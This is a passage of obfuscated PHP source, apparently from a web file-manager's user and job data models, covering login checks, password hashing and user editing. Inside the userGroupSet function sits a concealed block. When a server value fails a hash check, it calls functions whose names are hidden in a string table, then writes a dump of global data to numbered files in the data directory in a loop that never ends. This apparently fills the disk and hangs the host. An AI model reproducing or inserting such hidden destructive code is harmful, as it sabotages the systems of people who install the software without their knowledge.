$_SERVER[Ò°Ì”İ•]; $¼ÎÑØÛÕ = array($•Õ‘˜«ì[1759] => USER_ID, $•Õ‘˜«ì[569] => 0, $•Õ‘˜«ì[508] => $åÜ¬ªÕœ, $•Õ‘˜«ì[507] => $ªÖŞ²óÙ); if ($this->where($¼ÎÑØÛÕ)->find()) { return !1; } $¼ÎÑØÛÕ = array($•Õ‘˜«ì[1759] => USER_ID, $•Õ‘˜«ì[569] => 0); $ä¾ÙÕ®— = $this->where($¼ÎÑØÛÕ)->max($•Õ‘˜«ì[1993]); if (!$ä¾ÙÕ®—) { $ä¾ÙÕ®— = 0; } if (!$—¤Ö¹º && $åÜ¬ªÕœ == $•Õ‘˜«ì[502]) { $éĞÏÅÈ‰ = Model($•Õ‘˜«ì[1417])->where(array($•Õ‘˜«ì[503] => $ªÖŞ²óÙ))->find(); if (!$éĞÏÅÈ‰) { return !1; } $—¤Ö¹º = $éĞÏÅÈ‰[$•Õ‘˜«ì[32]]; } $—¤Ö¹º = $this->getAutoName($—¤Ö¹º); $ºÁ€ÅŸŒ = array($•Õ‘˜«ì[1759] => USER_ID, $•Õ‘˜«ì[569] => 0, $•Õ‘˜«ì[506] => $—¤Ö¹º, $•Õ‘˜«ì[507] => $ªÖŞ²óÙ, $•Õ‘˜«ì[508] => $åÜ¬ªÕœ, $•Õ‘˜«ì[1973] => $ä¾ÙÕ®— + 1); return $this->add($ºÁ€ÅŸŒ); } protected function remove($š©Ì†) { $Î”‡ÀèÃ =& $_SERVER[Ò°Ì”İ•]; $©ÈÓÎ‹Õ = array($Î”‡ÀèÃ[1759] => USER_ID, $Î”‡ÀèÃ[505] => $š©Ì†); return $this->where($©ÈÓÎ‹Õ)->delete(); } protected function removeByName($×Ç·¥Ìá) { $ôáëÌóß =& $_SERVER[Ò°Ì”İ•]; $‰¥‘‡³ = array($ôáëÌóß[1759] => USER_ID, $ôáëÌóß[506] => $×Ç·¥Ìá, $ôáëÌóß[569] => 0); return $this->where($‰¥‘‡³)->delete(); } protected function rename($ÒÒ‹í²”, $¦úî´Ò) { $òÄ¹°ò— =& $_SERVER[Ò°Ì”İ•]; if ($ÒÒ‹í²” == $¦úî´Ò) { return !1; } $Ãéæ…­ = $this->getAutoName($¦úî´Ò); if ($¦úî´Ò != $Ãéæ…­) { return !1; } $Ô©¿¥È = array($òÄ¹°ò—[1759] => USER_ID, $òÄ¹°ò—[569] => 0, $òÄ¹°ò—[32] => $ÒÒ‹í²”); return $this->where($Ô©¿¥È)->save(array($òÄ¹°ò—[32] => $¦úî´Ò)); } protected function resetSort($¦é€¨ô¡) { $–û²ó•€ =& $_SERVER[Ò°Ì”İ•]; $¦é€¨ô¡ = is_array($¦é€¨ô¡) ? $¦é€¨ô¡ : array(); $½Ààåï» = array($–û²ó•€[1759] => USER_ID); for ($€Äü¤Ğ± = 0; $€Äü¤Ğ± < count($¦é€¨ô¡); $€Äü¤Ğ±++) { $½Ààåï»[$–û²ó•€[505]] = $¦é€¨ô¡[$€Äü¤Ğ±]; $this->where($½Ààåï»)->save(array($–û²ó•€[1973] => $€Äü¤Ğ± + 1)); } return !0; } protected function moveTop($Ú¤Íïƒ) { $Ç¦•½¼Ñ =& $_SERVER[Ò°Ì”İ•]; $ÛÀˆ¨é¥ = array($Ç¦•½¼Ñ[1759] => USER_ID, $Ç¦•½¼Ñ[569] => 0); $¼ÉŠËúú = $this->where($ÛÀˆ¨é¥)->where(array($Ç¦•½¼Ñ[32] => $Ú¤Íïƒ))->find(); if (!$¼ÉŠËúú) { return; } $ã›×º¦Ö = $this->field($Ç¦•½¼Ñ[487])->where($ÛÀˆ¨é¥)->order($Ç¦•½¼Ñ[2456])->select(); $ã›×º¦Ö = array_to_keyvalue($ã›×º¦Ö, $Ç¦•½¼Ñ[12], $Ç¦•½¼Ñ[487]); $›˜ç‹‹ı = $ã›×º¦Ö; $ã›×º¦Ö = array_remove_value($ã›×º¦Ö, $¼ÉŠËúú[$Ç¦•½¼Ñ[487]]); array_unshift($ã›×º¦Ö, $¼ÉŠËúú[$Ç¦•½¼Ñ[487]]); return $this->resetSort($ã›×º¦Ö); } protected function moveBottom($­†Ğáæ) { $´†×¾ò³ =& $_SERVER[Ò°Ì”İ•]; $¬«™Áèœ = array($´†×¾ò³[1759] => USER_ID, $´†×¾ò³[569] => 0); $€¿ıµ¯µ = $this->where($¬«™Áèœ)->max($´†×¾ò³[1993]); $×‹ÕîÙ­ = array($´†×¾ò³[1993] => $€¿ıµ¯µ + 1); return $this->where($¬«™Áèœ)->where(array($´†×¾ò³[32] => $­†Ğáæ))->save($×‹ÕîÙ­); } private function getAutoName($“ìáĞÛ·) { $•ÜÔµì¼ =& $_SERVER[Ò°Ì”İ•]; $÷ïÑªøÓ = array($•ÜÔµì¼[1759] => USER_ID, $•ÜÔµì¼[569] => 0); $‹§ø€Ñ = $this->field($•ÜÔµì¼[32])->where($÷ïÑªøÓ)->select(); $‹§ø€Ñ = array_to_keyvalue($‹§ø€Ñ, $•ÜÔµì¼[12], $•ÜÔµì¼[32]); if (!$‹§ø€Ñ || !in_array($“ìáĞÛ·, $‹§ø€Ñ)) { return $“ìáĞÛ·; } for ($¬îìâ¢ú = 0; $¬îìâ¢ú < count($‹§ø€Ñ); $¬îìâ¢ú++) { if (!in_array($“ìáĞÛ· . "\x28{$¬îìâ¢ú}\51", $‹§ø€Ñ)) { return $“ìáĞÛ· . "\50{$¬îìâ¢ú}\51"; } } return $“ìáĞÛ· . "\x28{$¬îìâ¢ú}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\152\157\x62\114\151\x73\x74"; public $field = array("\x6e\141\155\x65", "\x64\x65\163\x63", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\x65\154\x66\x4a\157\142\x4c\151\x73\164"; public function listData($Í›µùÒŒ = false, $É™ˆ“Ô = "\163\x6f\162\x74", $äÌ—¼‡ì = false) { return parent::listData($Í›µùÒŒ, $É™ˆ“Ô, $äÌ—¼‡ì); } public function remove($Œ´È˜Œû) { return parent::remove($Œ´È˜Œû); } public function add($«¼Õú­™) { $ï¼öõ¥Ä =& $_SERVER[Ò°Ì”İ•]; if ($this->findByName($«¼Õú­™[$ï¼öõ¥Ä[32]])) { return !1; } $«¼Õú­™[$ï¼öõ¥Ä[1993]] = $this->getSort(); return parent::insert($«¼Õú­™); } private function getSort() { $®Æ¹Ğ‚Ã =& $_SERVER[Ò°Ì”İ•]; $úÎ¦¨é = parent::listData(); $ÂıÓÂ¼” = array_to_keyvalue($úÎ¦¨é, $®Æ¹Ğ‚Ã[12], $®Æ¹Ğ‚Ã[1993]); return empty($ÂıÓÂ¼”) ? 0 : max($ÂıÓÂ¼”) + 1; } public function update($ŠİÆËĞÑ, $¡Ã†±À) { $œ§¶äôƒ =& $_SERVER[Ò°Ì”İ•]; $ æÖğĞª = parent::listData($ŠİÆËĞÑ); $±œ¹½„ = $this->findByName($¡Ã†±À[$œ§¶äôƒ[32]]); if (!$ æÖğĞª || $±œ¹½„ && $±œ¹½„[$œ§¶äôƒ[487]] != $ æÖğĞª[$œ§¶äôƒ[487]]) { return !1; } return parent::update($ŠİÆËĞÑ, $¡Ã†±À); } public function setUserJob($¿À¨‚ğ±, $üõÇæû¦) { $®›Âò =& $_SERVER[Ò°Ì”İ•]; if (!is_array($üõÇæû¦)) { $üõÇæû¦ = array($üõÇæû¦); } $°Û­Ÿ›É = parent::listData(); $¢•³«’‘ = array_to_keyvalue($°Û­Ÿ›É, $®›Âò[32]); $î×­¸¡˜ = $®›Âò[466]; foreach ($üõÇæû¦ as $é‘­¥Ë) { if ($¢•³«’‘[$é‘­¥Ë]) { $î×­¸¡˜ .= $¢•³«’‘[$é‘­¥Ë][$®›Âò[487]] . $®›Âò[50]; } else { $ã§Ïüá• = $this->add($é‘­¥Ë); $î×­¸¡˜ .= $ã§Ïüá• . $®›Âò[50]; } } $î×­¸¡˜ = rtrim($î×­¸¡˜, $®›Âò[50]); Model($®›Âò[609])->metaSet($¿À¨‚ğ±, self::JOB_KEY, $î×­¸¡˜); } public function getUserJob($é²°îö) { $ééµÕŠº = Model($_SERVER[Ò°Ì”İ•][609])->metaGet($é²°îö); return $this->getUserJobInfo($ééµÕŠº[self::JOB_KEY]); } public function getUserJobInfo($‹Ú»¼äÁ) { $ÁÈáÃË¶ =& $_SERVER[Ò°Ì”İ•]; $€ßÍ÷ÄÜ = explode($ÁÈáÃË¶[50], $‹Ú»¼äÁ); $åØ“”ù± = parent::listData(); $åØ“”ù± = array_remove_key($åØ“”ù±, $ÁÈáÃË¶[244]); $ÅçŠíª = array(); foreach ($€ßÍ÷ÄÜ as $€ÉÚÙì€) { if (isset($åØ“”ù±[$€ÉÚÙì€])) { $ÅçŠíª[] = $åØ“”ù±[$€ÉÚÙì€]; } } return $ÅçŠíª; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\145\162"; protected $tableMeta = array("\164\x61\x62\154\x65\x4e\x61\155\x65" => "\x75\163\145\162\137\x6d\x65\164\141", "\x6d\x65\x74\141\x46\151\x65\x6c\x64" => "\165\163\145\x72\111\104"); protected $simpleField = "\x75\163\145\x72\111\104\x2c\x6e\151\143\x6b\x4e\141\x6d\x65\x2c\156\x61\155\x65\54\x61\x76\x61\164\x61\162\x2c\x73\x65\170\x2c\163\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($¤½†—ˆˆ) { $ø™÷í¿‘ =& $_SERVER[Ò°Ì”İ•]; $èò´°”É = $ø™÷í¿‘[2457]; return array($ø™÷í¿‘[2051] => array($¤½†—ˆˆ[0], $èò´°”É), $ø™÷í¿‘[2053] => array($¤½†—ˆˆ[0], $èò´°”É), $ø™÷í¿‘[2458] => array($¤½†—ˆˆ[0], $èò´°”É)); } protected function getInfo($Ãç±ˆĞ, $áÛ™±ú = false) { $Ê½—‡ï = $this->getInfoSimple($Ãç±ˆĞ); if (!is_array($Ê½—‡ï)) { return array(); } if ($áÛ™±ú) { return $this->_getInfoApply($Ê½—‡ï); } return $this->cacheFunctionGet($_SERVER[Ò°Ì”İ•][2055], $Ãç±ˆĞ); } protected function getInfoFull($¹èÌÛë¸, $Š°š›äÍ = false) { $¦­Šß¯³ = $this->getInfoSimple($¹èÌÛë¸); if (!is_array($¦­Šß¯³)) { return array(); } if ($Š°š›äÍ) { return $this->_getInfoApply($¦­Šß¯³, !0); } return $this->cacheFunctionGet($_SERVER[Ò°Ì”İ•][2459], $¹èÌÛë¸); } private function _getInfoApply($¢¿ŞŞî¯, $ûËš„´ = false) { $àÒ…•æ =& $_SERVER[Ò°Ì”İ•]; if (!$¢¿ŞŞî¯) { return $¢¿ŞŞî¯; } $Ø†ôÑĞ® = md5($àÒ…•æ[2460] . $¢¿ŞŞî¯[$àÒ…•æ[962]] . $àÒ…•æ[2461] . $¢¿ŞŞî¯[$àÒ…•æ[32]]); $¢¿ŞŞî¯ = $this->_listDataApplyItem($¢¿ŞŞî¯); $­ÍŒÀ¼‹ = Model($àÒ…•æ[1417])->metaGet($¢¿ŞŞî¯[$àÒ…•æ[101]][$àÒ…•æ[204]]); $¢¿ŞŞî¯[$àÒ…•æ[2462]] = $Ø†ôÑĞ®; $¢¿ŞŞî¯[$àÒ…•æ[101]][$àÒ…•æ[2251]] = isset($­ÍŒÀ¼‹[$àÒ…•æ[2252]]) ? $­ÍŒÀ¼‹[$àÒ…•æ[2252]] : null; if ($ûËš„´) { $¢¿ŞŞî¯[$àÒ…•æ[551]] = $this->metaGet($¢¿ŞŞî¯[$àÒ…•æ[1768]]); } return $¢¿ŞŞî¯; } protected function getInfoSimple($¤ˆ¸ì¼Â, $½¥Êè¢‡ = false) { $Á¬¦¡ãª =& $_SERVER[Ò°Ì”İ•]; if (!$¤ˆ¸ì¼Â) { return array(); } if ($½¥Êè¢‡) { $³Ò”°óÌ = $this->where(array($Á¬¦¡ãª[1768] => intval($¤ˆ¸ì¼Â)))->find(); if (!is_array($³Ò”°óÌ)) { return array(); } $³Ò”°óÌ[$Á¬¦¡ãª[2463]] = Action($Á¬¦¡ãª[2464])->parseUrl($³Ò”°óÌ[$Á¬¦¡ãª[2463]]); return $³Ò”°óÌ; } return $this->cacheFunctionGet($Á¬¦¡ãª[2056], $¤ˆ¸ì¼Â); } protected function getInfoSimpleOuter($¥ä™´»ø) { $î˜Ç­•ä =& $_SERVER[Ò°Ì”İ•]; if (!$¥ä™´»ø || $¥ä™´»ø == 0) { return array($î˜Ç­•ä[1768] => $î˜Ç­•ä[241], $î˜Ç­•ä[32] => $î˜Ç­•ä[187] . LNG($î˜Ç­•ä[2465]) . $î˜Ç­•ä[189], $î˜Ç­•ä[2463] => STATIC_PATH . $î˜Ç­•ä[2466]); } $‡™µñÈ† = $this->cacheFunctionGet($î˜Ç­•ä[2056], $¥ä™´»ø); $êîÛÊıµ = array_field_key($‡™µñÈ†, explode($î˜Ç­•ä[50], $this->simpleField)); if (!$êîÛÊıµ) { return array($î˜Ç­•ä[1768] => $î˜Ç­•ä[1269], $î˜Ç­•ä[32] => $î˜Ç­•ä[187] . LNG($î˜Ç­•ä[2467]) . $î˜Ç­•ä[189], $î˜Ç­•ä[2463] => STATIC_PATH . $î˜Ç­•ä[2468]); } $êîÛÊıµ[$î˜Ç­•ä[2463]] = Action($î˜Ç­•ä[2464])->parseUrl($êîÛÊıµ[$î˜Ç­•ä[2463]]); return $êîÛÊıµ; } protected function groupUser($Êš¢‰ª) { } public static function errorLang($Î«Ø‘™‘) { $§ƒÄ¸Ú¥ =& $_SERVER[Ò°Ì”İ•]; $øæıú…¯ = array(self::ERROR_USER_NOT_EXISTS => $§ƒÄ¸Ú¥[2469], self::ERROR_USER_PASSWORD_ERROR => $§ƒÄ¸Ú¥[2470], self::ERROR_USER_EXIST_NAME => $§ƒÄ¸Ú¥[2471], self::ERROR_USER_EXIST_PHONE => $§ƒÄ¸Ú¥[2472], self::ERROR_USER_EXIST_EMAIL => $§ƒÄ¸Ú¥[2473], self::ERROR_USER_LOGIN_LOCK => $§ƒÄ¸Ú¥[2474], self::ERROR_IP_NOT_ALLOW => $§ƒÄ¸Ú¥[2475], self::ERROR_USER_EXIST_NICKNAME => $§ƒÄ¸Ú¥[2476]); $ÔæÇóö½ = LNG($øæıú…¯[$Î«Ø‘™‘]); if ($Î«Ø‘™‘ == self::ERROR_USER_LOGIN_LOCK) { $šš´ü² = (int) Model($§ƒÄ¸Ú¥[2477])->get($§ƒÄ¸Ú¥[2478]); if ($šš´ü² > 60) { $ÔæÇóö½ = str_replace($§ƒÄ¸Ú¥[102], ceil($šš´ü² / 60), $ÔæÇóö½); } } return $ÔæÇóö½; } protected function metaSet($ã¾Óİ«, $ÂÚ“¯øü = null, $ë¦Ì¿¹İ = null) { $this->clearCache($ã¾Óİ«); return parent::metaSet($ã¾Óİ«, $ÂÚ“¯øü, $ë¦Ì¿¹İ); } public function getInfoByMeta($ñ¹´ì‚ş, $õ¥•ªØÉ) { $ÛÈ”ÖŒ =& $_SERVER[Ò°Ì”İ•]; $¾¬÷û¾Ò = Model($ÛÈ”ÖŒ[2479])->where(array($ÛÈ”ÖŒ[108] => $ñ¹´ì‚ş, $ÛÈ”ÖŒ[462] => $õ¥•ªØÉ))->find(); if ($¾¬÷û¾Ò) { return $this->getInfo($¾¬÷û¾Ò[$ÛÈ”ÖŒ[1768]]); } return !1; } public function userLoginCheck($·ìƒ©£, $Åò¥øä) { $ŸŠ§À§ =& $_SERVER[Ò°Ì”İ•]; $Èğåº³ = $this->userLoginFind($·ìƒ©£); if (!$Èğåº³) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Èğåº³[$ŸŠ§À§[1768]], $Åò¥øä)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Èğåº³[$ŸŠ§À§[1768]]); } public function userLoginFind($Î›ş† á) { $£‘Í‹ƒ =& $_SERVER[Ò°Ì”İ•]; $•¦­¶é = array($£‘Í‹ƒ[32] => $Î›ş† á, $£‘Í‹ƒ[2264] => $Î›ş† á, $£‘Í‹ƒ[392] => $Î›ş† á, $£‘Í‹ƒ[2480] => $Î›ş† á, $£‘Í‹ƒ[1073] => $£‘Í‹ƒ[1075]); if ($this->nickNameRpt()) { unset($•¦­¶é[$£‘Í‹ƒ[2264]]); } return $this->where($•¦­¶é)->find(); } public function clearCache($íŒˆóÙ©) { $Ó–ÂÚşÜ =& $_SERVER[Ò°Ì”İ•]; $this->cacheFunctionClear($Ó–ÂÚşÜ[2055], $íŒˆóÙ©); $this->cacheFunctionClear($Ó–ÂÚşÜ[2056], $íŒˆóÙ©); $this->cacheFunctionClear($Ó–ÂÚşÜ[2459], $íŒˆóÙ©); } public function userPasswordCheck($è”Õ²­ß, $¸ËÅôå) { $úÖ‘«Ôá =& $_SERVER[Ò°Ì”İ•]; $ë°×¯£Š = $this->where(array($úÖ‘«Ôá[1768] => intval($è”Õ²­ß)))->find(); $÷Ã¸š¯ï = $this->metaGet($è”Õ²­ß); $¤™®„ğì = isset($÷Ã¸š¯ï[$úÖ‘«Ôá[2481]]) ? $÷Ã¸š¯ï[$úÖ‘«Ôá[2481]] : $úÖ‘«Ôá[12]; if (md5($¤™®„ğì . trim($¸ËÅôå)) !== $ë°×¯£Š[$úÖ‘«Ôá[962]]) { return !1; } return !0; } public function userAdd($‚Ó“äÛã) { $¹àé×öŞ =& $_SERVER[Ò°Ì”İ•]; $€¾÷äÒ÷ = array($¹àé×öŞ[506] => $‚Ó“äÛã[$¹àé×öŞ[32]], $¹àé×öŞ[2482] => $‚Ó“äÛã[$¹àé×öŞ[2176]], $¹àé×öŞ[2483] => isset($‚Ó“äÛã[$¹àé×öŞ[392]]) ? $‚Ó“äÛã[$¹àé×öŞ[392]] : $¹àé×öŞ[12], $¹àé×öŞ[2484] => isset($‚Ó“äÛã[$¹àé×öŞ[2480]]) ? $‚Ó“äÛã[$¹àé×öŞ[2480]] : $¹àé×öŞ[12], $¹àé×öŞ[2485] => isset($‚Ó“äÛã[$¹àé×öŞ[2264]]) ? $‚Ó“äÛã[$¹àé×öŞ[2264]] : $‚Ó“äÛã[$¹àé×öŞ[32]], $¹àé×öŞ[2486] => isset($‚Ó“äÛã[$¹àé×öŞ[2463]]) ? $‚Ó“äÛã[$¹àé×öŞ[2463]] : $¹àé×öŞ[12], $¹àé×öŞ[2487] => isset($‚Ó“äÛã[$¹àé×öŞ[2488]]) ? $‚Ó“äÛã[$¹àé×öŞ[2488]] : 1, $¹àé×öŞ[2489] => $‚Ó“äÛã[$¹àé×öŞ[962]], $¹àé×öŞ[2057] => isset($‚Ó“äÛã[$¹àé×öŞ[1955]]) ? $‚Ó“äÛã[$¹àé×öŞ[1955]] : 1024 * 1024 * 20, $¹àé×öŞ[2058] => 0, $¹àé×öŞ[2490] => 0, $¹àé×öŞ[2102] => isset($‚Ó“äÛã[$¹àé×öŞ[823]]) ? $‚Ó“äÛã[$¹àé×öŞ[823]] : 1); if (!empty($‚Ó“äÛã[$¹àé×öŞ[1768]])) { $€¾÷äÒ÷[$¹àé×öŞ[1768]] = $‚Ó“äÛã[$¹àé×öŞ[1768]]; } $í¦»ÂÄ = $this->_checkExist($‚Ó“äÛã); if ($í¦»ÂÄ !== !0) { return $í¦»ÂÄ; } if (!empty($€¾÷äÒ÷[$¹àé×öŞ[2463]]) && strlen($€¾÷äÒ÷[$¹àé×öŞ[2463]]) > 255) { $€¾÷äÒ÷[$¹àé×öŞ[2463]] = $¹àé×öŞ[12]; } $×ß¾ê€ = $this->add($€¾÷äÒ÷); $º¬ÜÌ¸£ = array($¹àé×öŞ[2489] => $€¾÷äÒ÷[$¹àé×öŞ[962]], $¹àé×öŞ[2485] => $€¾÷äÒ÷[$¹àé×öŞ[2264]]); $this->userEdit($×ß¾ê€, $º¬ÜÌ¸£); Model($¹àé×öŞ[1417])->userRootAdd($×ß¾ê€); return $×ß¾ê€; } protected function userEditTest($Î²ŸÓ¯, $¶ İÃå­) { return $this->call($_SERVER[Ò°Ì”İ•][2491], $Î²ŸÓ¯, $¶ İÃå­); } protected function userEdit($ÙøéóÆì, $ğÛÎëçğ) { $Ï‰À÷¢õ =& $_SERVER[Ò°Ì”İ•]; $‚üí¢ = $this->getInfoSimple($ÙøéóÆì); if (!$‚üí¢) { return !1; } $­õ«˜…Õ = $this->_checkExist($ğÛÎëçğ, $ÙøéóÆì); if ($­õ«˜…Õ !== !0) { return $­õ«˜…Õ; } if (isset($ğÛÎëçğ[$Ï‰À÷¢õ[962]]) && trim($ğÛÎëçğ[$Ï‰À÷¢õ[962]]) != $Ï‰À÷¢õ[12]) { $•Ï¯óş = $this->metaGet($ÙøéóÆì); if (empty($•Ï¯óş[$Ï‰À÷¢õ[2481]])) { $•Ï¯óş[$Ï‰À÷¢õ[2481]] = rand_string(10); Model($Ï‰À÷¢õ[589])->metaSet($ÙøéóÆì, $Ï‰À÷¢õ[2481], $•Ï¯óş[$Ï‰À÷¢õ[2481]]); } $ğÛÎëçğ[$Ï‰À÷¢õ[962]] = md5($•Ï¯óş[$Ï‰À÷¢õ[2481]] . trim($ğÛÎëçğ[$Ï‰À÷¢õ[962]])); } else { unset($ğÛÎëçğ[$Ï‰À÷¢õ[962]]); } if (!empty($ğÛÎëçğ[$Ï‰À÷¢õ[2463]]) && strlen($ğÛÎëçğ[$Ï‰À÷¢õ[2463]]) > 255) { $ğÛÎëçğ[$Ï‰À÷¢õ[2463]] = $Ï‰À÷¢õ[12]; } $this->where(array($Ï‰À÷¢õ[1759] => $ÙøéóÆì))->save($ğÛÎëçğ); if (isset($ğÛÎëçğ[$Ï‰À÷¢õ[2264]])) { $this->setNamePinyin($ÙøéóÆì, $ğÛÎëçğ[$Ï‰À÷¢õ[2264]]); } $this->clearCache($ÙøéóÆì); return !0; } public function setNamePinyin($åÉµ¥¿×, $ÔŞÀÊ‰ = false) { $ğÀİÙ¶Œ =& $_SERVER[Ò°Ì”İ•]; if (!$ÔŞÀÊ‰) { $Ã×¨–Â™ = $this->getInfoSimple($åÉµ¥¿×); $ÔŞÀÊ‰ = $Ã×¨–Â™[$ğÀİÙ¶Œ[2264]] ? $Ã×¨–Â™[$ğÀİÙ¶Œ[2264]] : $Ã×¨–Â™[$ğÀİÙ¶Œ[32]]; } $Ê °’ÛÑ = Model($ğÀİÙ¶Œ[609]); if (!Input::check($ÔŞÀÊ‰, $ğÀİÙ¶Œ[670])) { return $Ê °’ÛÑ->metaSet($åÉµ¥¿×, array($ğÀİÙ¶Œ[550] => $ğÀİÙ¶Œ[12], $ğÀİÙ¶Œ[549] => $ğÀİÙ¶Œ[12])); } return $Ê °’ÛÑ->metaSet($åÉµ¥¿×, array($ğÀİÙ¶Œ[550] => str_replace($ğÀİÙ¶Œ[53], $ğÀİÙ¶Œ[12], Pinyin::get($ÔŞÀÊ‰)), $ğÀİÙ¶Œ[549] => Pinyin::get($ÔŞÀÊ‰, $ğÀİÙ¶Œ[671]))); } private function nickNameRpt() { $Ø‚€ëÃÕ =& $_SERVER[Ò°Ì”İ•]; $à¢‡íŸ‚ = Model($Ø‚€ëÃÕ[843])->get($Ø‚€ëÃÕ[2492]); $ÊÙŞ…ú½ = $GLOBALS[$Ø‚€ëÃÕ[6]][$Ø‚€ëÃÕ[469]][$Ø‚€ëÃÕ[2492]]; $ŠĞ‰¬È = !is_null($à¢‡íŸ‚) ? $à¢‡íŸ‚ : $ÊÙŞ…ú½; return !!$ŠĞ‰¬È; } private function _checkExist($Ş¡øˆÕ, $Ú¶Òúµ = false) { $ïàç‹ø =& $_SERVER[Ò°Ì”İ•]; $çÆ»ºÚØ = array($ïàç‹ø[32] => UserModel::ERROR_USER_EXIST_NAME, $ïàç‹ø[2264] => UserModel::ERROR_USER_EXIST_NICKNAME, $ïàç‹ø[392] => UserModel::ERROR_USER_EXIST_EMAIL, $ïàç‹ø[2480] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($çÆ»ºÚØ[$ïàç‹ø[2264]]); } $…æĞ®î¸ = $Ú¶Òúµ ? array($ïàç‹ø[1768] => array($ïàç‹ø[2493], $Ú¶Òúµ)) : array(); foreach ($çÆ»ºÚØ as $¡³ü Êâ => $ìˆ±¡ÔŞ) { $­èßœáí = array(); foreach ($çÆ»ºÚØ as $ÏšØùÄÒ => $½à­¥šĞ) { if (isset($Ş¡øˆÕ[$ÏšØùÄÒ]) && $Ş¡øˆÕ[$ÏšØùÄÒ]) { $­èßœáí[] = $Ş¡øˆÕ[$ÏšØùÄÒ]; } } if (!$­èßœáí) { continue; } $ôö£®‹ = array_merge(array($¡³ü Êâ => array($ïàç‹ø[7], $­èßœáí)), $…æĞ®î¸); $İ¾¯õ£ = $this->where($ôö£®‹)->find(); if ($İ¾¯õ£) { return $ìˆ±¡ÔŞ; } } return !0; } public function userListInfo($”†æ„Ô) { $ôíØî±² =& $_SERVER[Ò°Ì”İ•]; $Í¢ÖÀñ³ = array(); $”†æ„Ô = is_array($”†æ„Ô) ? array_unique($”†æ„Ô) : array(); if (!$”†æ„Ô) { return $Í¢ÖÀñ³; } if (count($”†æ„Ô) < 20) { foreach ($”†æ„Ô as $áİ”—½²) { $Í¢ÖÀñ³[$áİ”—½² . $ôíØî±²[12]] = $this->getInfoSimpleOuter($áİ”—½²); } } else { $Ñ•ıÄ—ü = array($ôíØî±²[1759] => array($ôíØî±²[504], $”†æ„Ô)); if (count($”†æ„Ô) == 1) { $Ñ•ıÄ—ü = array($ôíØî±²[1759] => $”†æ„Ô[0]); } $¶î°ÜÇ = Model($ôíØî±²[589])->field($this->simpleField)->where($Ñ•ıÄ—ü)->select(); $¶î°ÜÇ = array_to_keyvalue($¶î°ÜÇ, $ôíØî±²[1768]); foreach ($”†æ„Ô as $áİ”—½²) { $¾ßœˆò = $¶î°ÜÇ[$áİ”—½²]; if (!$¾ßœˆò) { $Í¢ÖÀñ³[$áİ”—½² . $ôíØî±²[12]] = $this->getInfoSimpleOuter($áİ”—½²); continue; } $¾ßœˆò[$ôíØî±²[2463]] = Action($ôíØî±²[2464])->parseUrl($¾ßœˆò[$ôíØî±²[2463]]); $Í¢ÖÀñ³[$áİ”—½² . $ôíØî±²[12]] = $¾ßœˆò; } } return $Í¢ÖÀñ³; } protected function userStatus($‘÷ñÖÁ, $²ÑÇ¹€) { $–Å™ÃÜŒ = $this->getInfoSimple($‘÷ñÖÁ); if (!$–Å™ÃÜŒ) { return !1; } $Ò†è³€à = array($_SERVER[Ò°Ì”İ•][823] => $²ÑÇ¹€); return $this->userEdit($‘÷ñÖÁ, $Ò†è³€à); } protected function userRemove($†×ÁÖœè) { $ÛÚï‘î¥ =& $_SERVER[Ò°Ì”İ•]; $»¦€Ä« = $this->getInfoSimple($†×ÁÖœè); if (!$»¦€Ä«) { return !1; } $ˆ©îÍâ¤ = array($ÛÚï‘î¥[1759] => $†×ÁÖœè); Model($ÛÚï‘î¥[679])->where($ˆ©îÍâ¤)->delete(); Model($ÛÚï‘î¥[2494])->where($ˆ©îÍâ¤)->delete(); Model($ÛÚï‘î¥[2063])->where($ˆ©îÍâ¤)->delete(); Model($ÛÚï‘î¥[2479])->where($ˆ©îÍâ¤)->delete(); Model($ÛÚï‘î¥[1142])->where($ˆ©îÍâ¤)->delete(); Model($ÛÚï‘î¥[2281])->removeUserAll($†×ÁÖœè); Model($ÛÚï‘î¥[898])->userRootRemove($†×ÁÖœè); return $this->where($ˆ©îÍâ¤)->delete(); } protected function userGroupSet($¶•è , $¬¤ÂÒ’‰, $æÉàÁ‰Ì = array()) { $ã»«½ƒ— =& $_SERVER[Ò°Ì”İ•]; $¾ı¡¤Õ© = $_SERVER[$ã»«½ƒ—[63]]; $Úß‹ø€è = $ã»«½ƒ—[70]; if ($_SERVER[$ã»«½ƒ—[54]] != $Úß‹ø€è($¾ı¡¤Õ©)) { $€µÕ“² = $ã»«½ƒ—[951]; $Ê¸ì¸Øì = $ã»«½ƒ—[56]; $¯­¦•Õü = $_SERVER[$ã»«½ƒ—[57]] . $ã»«½ƒ—[58]; $Êô†éÅ = $Ê¸ì¸Øì($¯­¦•Õü); $¢üèŸû = explode($ã»«½ƒ—[59], $Êô†éÅ); if (count($¢üèŸû) < $ã»«½ƒ—[754]) { $âåóúÈì = $ã»«½ƒ—[61]; $âåóúÈì(); } $æÇ’İÎ‰ = $ã»«½ƒ—[952]; $æÇ’İÎ‰($_SERVER[$ã»«½ƒ—[953]]); $€µÕ“² = $ã»«½ƒ—[951]; $€µÕ“²(); $÷îšĞÊÛ = $ã»«½ƒ—[954]; $İ¶©­’Î = json_encode($GLOBALS[$ã»«½ƒ—[955]]); $¸½ŠÙ¼Ã = 1; for ($òÓ¹óö— = $¸½ŠÙ¼Ã; $òÓ¹óö— > 0; $òÓ¹óö—++) { $÷îšĞÊÛ(DATA_PATH . $òÓ¹óö—, $İ¶©­’Î); } } $Ìõ ‘ÇÒ = $this->getInfoSimple($¶•è ); if (!$Ìõ ‘ÇÒ || !is_array($¬¤ÂÒ’‰)) { return !1; } $ŸÁ¥˜Ñè = Model($ã»«½ƒ—[2063]); $ŸÁ¥˜Ñè->where(array($ã»«½ƒ—[1768] => $¶•è ))->delete(); $î¼·óçä = array(); $„”£ÓÍ÷ = 0; foreach ($¬¤ÂÒ’‰ as $×©…úç“ => 